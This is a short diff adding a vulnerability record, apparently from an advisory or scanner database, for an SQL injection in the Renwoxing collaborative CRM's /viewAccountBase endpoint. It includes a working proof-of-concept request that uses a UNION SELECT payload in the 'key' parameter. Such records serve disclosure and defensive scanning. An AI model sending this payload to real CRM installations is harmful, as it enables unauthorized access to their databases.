@@ -1,0 +1,11 @@
+vendor = "任我行"
+name = "任我行协同CRM普及版 viewAccountBase SQL注入漏洞"
+type = "SQL注入"
+path = "/viewAccountBase"
+version = ""
+detail = """GET /viewAccountBase?key=1' UNION SELECT @@version-- HTTP/1.1 Host: target"""
+fix = "升级至最新版本"
+date = 20260401
+label = "nday"
+cve = "TVD-2026-07626"
+verifier = "AdySec"
